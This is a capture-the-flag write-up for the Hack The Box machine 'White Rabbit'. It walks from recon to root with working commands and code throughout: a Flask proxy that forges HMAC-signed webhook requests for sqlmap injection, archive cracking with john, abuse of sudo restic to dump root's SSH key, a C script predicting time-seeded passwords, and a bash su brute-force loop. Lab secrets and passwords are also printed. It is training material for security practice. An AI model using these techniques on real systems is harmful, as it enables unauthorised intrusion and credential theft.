# HTB: White Rabbit – Full Writeup (User → Root)

### Category: Linux  
### Methodology: Enumeration → SQLi → File restore → SSH pivot → Reversing → Password Brute → Root  

---

## Step 1: Initial Recon

```bash
nmap -sC -sV -oN nmap.txt 10.10.11.63
```

Add hostname:

```sh
echo "10.10.11.63 whiterabbit.htb" | sudo tee -a /etc/hosts
```

## Step 2: Subdomain/VHost Discovery

* Use ffuf:

```sh
ffuf -u http://whiterabbit.htb/ -H "Host: FUZZ.whiterabbit.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0
```

Discovered:

    status.whiterabbit.htb

Visit http://status.whiterabbit.htb/status/temp to find more:

    a668910b5514e.whiterabbit.htb (WikiJS)

    ddb09a8558c9.whiterabbit.htb (Gophish)

    28efa8f7df.whiterabbit.htb (Webhook/n8n)

## Step 3: Gophish → n8n SQL Injection

From WikiJS, download:

curl http://a668910b5514e.whiterabbit.htb/gophish/gophish_to_phishing_score_database.json

Found:

    Webhook URL: http://28efa8f7df.whiterabbit.htb/webhook/<uuid>

    Secret key: 3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS

Create proxy:

# proxy.py

```py
from flask import Flask, request
import requests, json, hmac, hashlib

app = Flask(__name__)
SECRET = "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
WEBHOOK_URL = "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"

def sign(payload):
    payload_str = json.dumps(payload, separators=(',', ':'))
    return hmac.new(SECRET.encode(), payload_str.encode(), hashlib.sha256).hexdigest()

@app.route('/')
def proxy():
    email = request.args.get('q')
    payload = { "campaign_id": 1, "email": email, "message": "Clicked Link" }
    headers = { "Content-Type": "application/json", "x-gophish-signature": f"hmac={sign(payload)}" }
    r = requests.post(WEBHOOK_URL, headers=headers, json=payload)
    return r.text

app.run(port=5000)
```

Start Flask app:

```sh

python3 proxy.py

Use SQLMap:

sqlmap -u 'http://127.0.0.1:5000/?q=test@whiterabbit.htb' -p q --risk 3 --level 5 --batch

Discovered DB: temp, Table: command_log
```

## Step 4: Dump command_log

```sh
sqlmap -D temp -T command_log -u 'http://127.0.0.1:5000/?q=test@whiterabbit.htb' --dump

Found:

restic init --repo rest:http://75951e6ff.whiterabbit.htb
echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd

```

## Step 5: Restore with Restic

```sh
echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd
restic restore latest --target ./restored_data --repo rest:http://75951e6ff.whiterabbit.htb --password-file .restic_passwd

Extracted: bob.7z
```

## Step 6: Crack 7z Archive

```sh
7z2john bob.7z > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

Password: 1q2w3e4r5t6y

Extract key:

7z x bob.7z -p1q2w3e4r5t6y
```

## Step 7: SSH as Bob

```sh
ssh -i bob bob@whiterabbit.htb -p 2222

Check sudo:

sudo -l

Permitted: /usr/bin/restic
```

## Step 8: Escalate to Morpheus

```sh
echo toor123 > /tmp/.restic_passwd
sudo restic init --repo /tmp/morpheus --password-file /tmp/.restic_passwd
sudo restic -r /tmp/morpheus --password-file /tmp/.restic_passwd backup /root
sudo restic -r /tmp/morpheus --password-file /tmp/.restic_passwd dump latest /root/morpheus > morpheus_id_rsa
chmod 600 morpheus_id_rsa
ssh -i morpheus_id_rsa morpheus@whiterabbit.htb
```
## Step 9: Analyze Password Generator

```sh
From command_log:

cd /home/neo && /opt/neo-password-generator/neo-password-generator | passwd

Recreate C generator:
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main() {
    char cs[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    char pwd[21];
    struct tm tm = {
        .tm_year = 2024-1900,
        .tm_mon = 8-1,
        .tm_mday = 30,
        .tm_hour = 14,
        .tm_min = 40,
        .tm_sec = 42
    };
    time_t t = timegm(&tm);
    for (int ms = 0; ms < 1000; ms++) {
        srand(t * 1000 + ms);
        for (int i = 0; i < 20; i++) pwd[i] = cs[rand() % 62];
        pwd[20] = '\0';
        printf("%s\n", pwd);
    }
    return 0;
}
```

Build & run:

```sh
gcc -o gen neo_gen.c
./gen > passwords.txt
```
## Step 10: Brute-Force Neo Password

Create script:

```sh
#!/bin/bash
while read pass; do
  echo "$pass" | su neo -c 'whoami' 2>/dev/null | grep neo && echo "[+] Password: $pass" && break
done < /tmp/passwords.txt
```

Password found: WBSxhWgfnMiclrV4dqfj
## Step 11: PrivEsc to Root

```sh
su neo
# Password: WBSxhWgfnMiclrV4dqfj

sudo -l
sudo su -
whoami
cat /root/root.txt
```

### Final Summary
Step	Description	Status
Recon	Port scan, subdomain enum	✅
SQLi	n8n webhook injection	✅
Restore	Restic backup and 7z crack	✅
Pivot	SSH as Bob and Morpheus	✅
Reversing	Analyze and recreate password gen	✅
Brute	Brute-force neo login	✅
Root	sudo escalation	✅
### Takeaways

    n8n workflows can expose dangerous injection paths

    Restic + exposed logs = root

    Time-based password generation is fragile

    Simple bash scripts can replace tools like sucrack